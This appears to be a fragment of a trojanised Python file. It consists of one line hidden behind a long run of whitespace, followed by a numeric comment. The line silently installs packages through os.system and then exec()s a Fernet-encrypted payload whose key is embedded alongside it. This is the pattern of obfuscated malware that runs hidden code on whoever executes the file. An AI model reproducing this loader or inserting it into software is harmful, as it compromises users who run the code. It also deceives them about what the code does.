                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'3Pf__7TY3vEEj6A0dHibRAz8F2BqdijyMXLeaDw1Sp0=').decrypt(b'gAAAAABnurqzxpi8GC3wGSbJqqw-FlB5NZNjXGokSo7J8TDkVxQQI9fe4bbYX1MvD9LY5-it5DSrT9DfWN_7gC9qo1kqWx9FKrZvBW0vov6HpBXXWwO0q4-jD7D1B6648RdCs6LHz0woHRUcXk-0YQiC7_sVj6ZE9Q99nocQSI8NLozVndHEVTe1MFuuM0AVYErJSg92uXe4eH4a-2cxA4MDE6dq5OnRDA=='))
#505045329
